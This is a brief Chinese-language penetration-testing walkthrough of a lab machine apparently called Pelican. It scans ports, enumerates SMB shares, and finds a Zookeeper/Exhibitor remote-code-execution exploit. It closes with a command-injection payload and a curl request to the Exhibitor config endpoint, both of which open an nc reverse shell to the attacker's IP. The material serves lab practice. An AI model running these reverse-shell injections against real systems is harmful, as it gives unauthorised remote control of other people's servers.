针对目标服务器进行端口探测

```
sudo nmap -p- -vvv --min-rate 10000 192.168.227.98
```

![image-20241116201954185](https://s2.loli.net/2024/11/16/C46feqXjipUs7YV.png)

针对开放端口进行进一步的服务探测

```
sudo nmap -p22,139,445,631,2181,2222,8080,8081,39605 -A 192.168.227.98 -oX Pelican.xml
```

![image-20241116202013258](https://s2.loli.net/2024/11/16/nJ3oKiDzA2XQOHV.png)

优先从smb服务开始

```
enum4linux-ng 192.168.227.98 -A -C
```

![image-20241116202635196](https://s2.loli.net/2024/11/16/6pGS7dKZnFJRteL.png)

![image-20241116202646314](https://s2.loli.net/2024/11/16/oKDcEvxYVf5PszU.png)

```
smbclient -N //192.168.227.98/print$
smbclient -N //192.168.227.98/IPC$
```

两个文件夹均无法访问

我们逐个端口进行查看，2181的Zookeeper 3.4.6，通过Google搜索关键字Zookeeper 3.4.6 exploit 获得一个可以RCE的漏洞

```
searchsploit -m 48654.txt
```

根据提示进行执行

```
$(/bin/nc -e /bin/sh 192.168.45.198 443 &)
```

curl -X POST -d 'busybox nc 192.168.45.198 443 -e sh' http://192.168.227.98:8080/exhibitor/v1/config/set
